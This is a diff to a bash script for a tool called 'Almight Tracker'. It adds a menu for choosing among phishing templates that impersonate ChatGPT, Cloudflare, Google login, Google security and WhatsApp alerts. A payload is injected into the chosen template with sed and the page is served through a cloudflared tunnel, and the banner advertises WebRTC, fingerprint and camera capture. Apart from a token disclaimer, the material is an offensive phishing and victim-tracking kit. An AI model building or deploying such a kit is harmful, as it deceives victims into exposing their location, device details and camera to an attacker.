@@ -13,8 +13,8 @@ printf '  ███████ ██      ██ ████ ██ ██ �
 printf '  ██   ██ ██      ██  ██  ██ ██ ██    ██ ██   ██    ██    \n'
 printf '  ██   ██ ███████ ██      ██ ██  ██████  ██   ██    ██    \n\n'
 printf '\e[1;31m       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n'                                                                                
-printf " \e[1;93m         Almight Tracker v0.3 - Enhanced Edition\e[0m \n"
-printf " \e[1;92m      IP Tracking + GPS Location + Censys Integration \e[0m \n"
+printf " \e[1;93m         Almight Tracker v0.4 - Advanced Edition\e[0m \n"
+printf " \e[1;92m   WebRTC + Fingerprint + Camera + Multi-Template \e[0m \n"
 printf "\e[1;90m Advanced tool for information gathering with automatic Censys lookup.\e[0m \n"
 printf "\n"
 printf "\e[1;33m ⚠️  DISCLAIMER: For AUTHORIZED testing ONLY. Use responsibly!\e[0m\n"
@@ -24,7 +24,6 @@ printf "\n"
 
 dependencies() {
 command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; } 
-
 }
 
 stop() {
@@ -132,7 +131,42 @@ fi
 if [[ -e ip.txt ]]; then
 rm -rf ip.txt
 fi
-sed -e '/tc_payload/r payload' index_chat.html > index.html
+
+# Template Selection Menu
+printf "\n\e[1;96m╔════════════════════════════════════════╗\e[0m\n"
+printf "\e[1;96m║     SELECT PHISHING TEMPLATE          ║\e[0m\n"
+printf "\e[1;96m╚════════════════════════════════════════╝\e[0m\n\n"
+printf "\e[1;92m[1]\e[0m ChatGPT Interface (Default)\n"
+printf "\e[1;92m[2]\e[0m Cloudflare Verification\n"
+printf "\e[1;92m[3]\e[0m Google Login\n"
+printf "\e[1;92m[4]\e[0m WhatsApp Security Alert\n"
+printf "\e[1;92m[5]\e[0m Google Security Team\n"
+printf "\n"
+read -p $'\e[1;93mSelect template [1-5]: \e[0m' template_choice
+
+case $template_choice in
+    2)
+        printf "\e[1;92m[+] Using Cloudflare template\e[0m\n"
+        sed -e '/tc_payload/r payload' templates/cloudflare.html > index.html
+        ;;
+    3)
+        printf "\e[1;92m[+] Using Google Login template\e[0m\n"
+        sed -e '/tc_payload/r payload' templates/google_login.html > index.html
+        ;;
+    4)
+        printf "\e[1;92m[+] Using WhatsApp Security template\e[0m\n"
+        sed -e '/tc_payload/r payload' templates/whatsapp_security.html > index.html
+        ;;
+    5)
+        printf "\e[1;92m[+] Using Google Security template\e[0m\n"
+        sed -e '/tc_payload/r payload' templates/google_security.html > index.html
+        ;;
+    *)
+        printf "\e[1;92m[+] Using ChatGPT template (default)\e[0m\n"
+        sed -e '/tc_payload/r payload' index_chat.html > index.html
+        ;;
+esac
+
 default_option_server="Y"
 read -p $'\n\e[1;93m Do you want to use cloudflared tunnel?\n \e[1;92motherwise it will be run on localhost:8080 [Default is Y] [Y/N]: \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
